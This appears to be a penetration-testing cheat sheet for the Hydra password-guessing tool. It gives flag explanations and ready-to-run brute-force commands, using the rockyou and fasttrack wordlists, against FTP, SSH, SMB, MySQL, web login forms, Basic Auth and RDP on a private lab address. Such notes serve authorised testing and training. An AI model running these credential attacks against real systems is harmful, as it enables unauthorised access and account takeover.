# Hydra

## Key Flags Reference

```bash
# Core flags you'll use constantly
-l          # single username
-L          # username list (file)
-p          # single password
-P          # password list (file)
-e nsr      # extra checks: (n)ull, (s)ame as user, (r)everse of user
-t          # threads (default 16, use -t 4 for stability on some services)
-V          # verbose, show each attempt
-f          # stop after first valid pair found
```

---

## FTP

```bash
# Single user, wordlist
hydra -l harry -P /usr/share/wordlists/rockyou.txt ftp://192.168.225.148

# User list, wordlist
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt ftp://192.168.225.148

# User list, quick checks (null/same/reverse) + wordlist combined
hydra -L users.txt -e nsr -P /usr/share/wordlists/fasttrack.txt ftp://192.168.225.148
```

---

## SSH

```bash
# Single user, wordlist
hydra -l harry -P /usr/share/wordlists/rockyou.txt ssh://192.168.225.148

# User list, wordlist — lower threads for stability
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.225.148

# Quick nsr check first before running full wordlist
hydra -L users.txt -e nsr ssh://192.168.225.148
```

---

## SMB

```bash
# Single user, wordlist
hydra -l harry -P /usr/share/wordlists/rockyou.txt smb://192.168.225.148

# User list, wordlist
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt smb://192.168.225.148

# Note: SMB can be unreliable with high thread counts, keep -t 1 or -t 4
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -t 1 smb://192.168.225.148
```

---

## MySQL

```bash
# Single user, wordlist
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.225.148

# User list — useful when you have db usernames from enumeration
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt mysql://192.168.225.148

# Quick null/default check (root with no password is common)
hydra -l root -e nsr mysql://192.168.225.148
```

---

## HTTP POST Login Form

```bash
# 3 required fields:
#   1: location of the login form      (e.g. /index.php)
#   2: POST body with ^USER^ ^PASS^    (e.g. username=^USER^&password=^PASS^)
#   3: failed login identifier string  (e.g. Invalid username or password)

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.225.148 http-post-form \
"/login.php:username=^USER^&password=^PASS^:Invalid username or password"
```

---

## HTTP GET (Basic Auth)

```bash
# Used when the page is protected by HTTP Basic Authentication (browser popup prompt)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.225.148 http-get /

# With a specific path
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.225.148 http-get /admin/
```

---

## RDP

```bash
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt rdp://192.168.225.148

# RDP is slow — keep threads low
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -t 4 rdp://192.168.225.148
```
